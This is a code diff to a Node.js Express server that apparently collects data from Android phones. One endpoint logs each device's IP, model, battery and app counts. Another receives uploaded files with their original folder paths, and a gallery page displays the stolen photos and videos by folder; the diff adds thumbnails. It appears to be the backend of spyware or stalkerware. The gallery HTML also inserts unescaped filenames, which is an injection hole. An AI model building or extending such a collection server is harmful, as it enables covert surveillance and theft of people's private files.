@@ -7,12 +7,13 @@ const app = express();
 /* ================= CONFIG ================= */
 
 const LOG_FILE = "logs.json";
-const UPLOAD_DIR = path.join(__dirname, "uploads");
 const CONFIG_FILE = "config.json";
 
-if (!fs.existsSync(UPLOAD_DIR)) {
-  fs.mkdirSync(UPLOAD_DIR);
-}
+const UPLOAD_DIR = path.join(__dirname, "uploads");
+const THUMB_DIR = path.join(__dirname, "thumbs");
+
+if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR);
+if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);
 
 /* ================= HELPERS ================= */
 
@@ -107,10 +108,9 @@ app.post('/track', (req, res) => {
       time: new Date().toISOString()
     };
 
-    // 🔥 Clean console log
     console.log("\n📱 DEVICE =====================");
     console.log(`IP: ${data.ip} | ${data.brand} ${data.model} | Android ${data.android}`);
-    console.log(`Battery: ${data.battery}% | Apps: ${data.app_count} (User: ${userApps.length}, System: ${systemApps.length})`);
+    console.log(`Battery: ${data.battery}% | Apps: ${data.app_count}`);
     console.log("======================================");
 
     saveLog(data);
@@ -138,9 +138,11 @@ app.post('/upload', (req, res) => {
     } catch {}
   }
 
-  // prevent overwrite
   const safeName = Date.now() + "_" + fileName;
   const filePath = path.join(UPLOAD_DIR, safeName);
+
+  const thumbName = "thumb_" + safeName;
+  const thumbPath = path.join(THUMB_DIR, thumbName);
 
   console.log("\n📦 FILE RECEIVED =====================");
   console.log(`Path: ${folder}`);
@@ -152,11 +154,15 @@ app.post('/upload', (req, res) => {
 
   req.on('end', () => {
 
+    // simple thumbnail (copy)
+    fs.copyFile(filePath, thumbPath, () => {});
+
     saveLog({
       type: "file",
       file: safeName,
       original: fileName,
       folder: folder,
+      thumb: thumbName,
       time: new Date().toISOString()
     });
 
@@ -214,9 +220,7 @@ app.get('/users', (req, res) => {
 
 /* ================= GALLERY ================= */
 
-
-
-    app.get('/gallery', (req, res) => {
+app.get('/gallery', (req, res) => {
 
   if (!fs.existsSync(LOG_FILE)) return res.send("No data");
 
@@ -235,105 +239,51 @@ app.get('/users', (req, res) => {
     grouped[key].push(f);
   });
 
-  let html = `
-  <html>
-  <head>
-    <style>
-      body { background:#111; color:#fff; font-family:sans-serif; }
-      .section { margin:20px 0; }
-      .grid { display:flex; flex-wrap:wrap; }
-      .card {
-        width:200px;
-        height:150px;
-        margin:10px;
-        background:#222;
-        display:flex;
-        align-items:center;
-        justify-content:center;
-        border-radius:10px;
-        cursor:pointer;
-        position:relative;
-      }
-      .card:hover { background:#333; }
-
-      .btn {
-        position:absolute;
-        bottom:5px;
-        left:5px;
-        right:5px;
-        text-align:center;
-        background:#000;
-        padding:3px;
-        font-size:12px;
-        border-radius:5px;
-      }
-    </style>
-  </head>
-
-  <body>
-    <h2>📁 Smart Gallery (No Auto Load)</h2>
-  `;
+  let html = `<html>
+  <body style="background:#111;color:#fff;font-family:sans-serif">
+  <h2>📁 Smart Gallery</h2>`;
 
   Object.keys(grouped).forEach(folder => {
 
-    html += `<div class="section">`;
-    html += `<h3>📂 ${folder}</h3>`;
-    html += `<div class="grid">`;
+    html += `<h3>📂 ${folder}</h3><div style="display:flex;flex-wrap:wrap">`;
 
     grouped[folder].reverse().forEach(f => {
 
-      const url = `/uploads/${f.file}`;
+      const full = `/uploads/${f.file}`;
+      const thumb = `/thumbs/${f.thumb}`;
 
       if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
-
         html += `
-        <div class="card" onclick="loadImage(this, '${url}')">
-          📷 Image
-          <div class="btn">
-            <a href="${url}" download style="color:#0af">Download</a>
-          </div>
+        <div style="margin:10px">
+          <img src="${thumb}" width="200"
+            onclick="this.src='${full}'" style="cursor:pointer"><br>
+          <a href="${full}" download>⬇ Download</a>
         </div>
         `;
       }
 
       else if (f.file.endsWith(".mp4")) {
-
         html += `
-        <div class="card" onclick="loadVideo(this, '${url}')">
-          🎬 Video
-          <div class="btn">
-            <a href="${url}" download style="color:#0af">Download</a>
-          </div>
+        <div style="margin:10px">
+          <video width="200" preload="metadata"
+            onclick="this.src='${full}'; this.play()">
+            <source src="${thumb}">
+          </video><br>
+          <a href="${full}" download>⬇ Download</a>
         </div>
         `;
       }
 
       else {
-        html += `
-        <div class="card">
-          <a href="${url}" download>${f.original}</a>
-        </div>
-        `;
+        html += `<a href="${full}">${f.original}</a>`;
       }
 
     });
 
-    html += `</div></div>`;
+    html += `</div>`;
   });
 
-  html += `
-  <script>
-    function loadImage(el, src) {
-      el.innerHTML = '<img src="' + src + '" style="width:100%;height:100%;border-radius:10px">';
-    }
-
-    function loadVideo(el, src) {
-      el.innerHTML = '<video src="' + src + '" controls style="width:100%;height:100%" preload="none"></video>';
-    }
-  </script>
-  </body>
-  </html>
-  `;
+  html += "</body></html>";
 
   res.send(html);
 });
@@ -341,6 +291,7 @@ app.get('/users', (req, res) => {
 /* ================= STATIC ================= */
 
 app.use('/uploads', express.static(UPLOAD_DIR));
+app.use('/thumbs', express.static(THUMB_DIR));
 
 /* ================= START ================= */
 
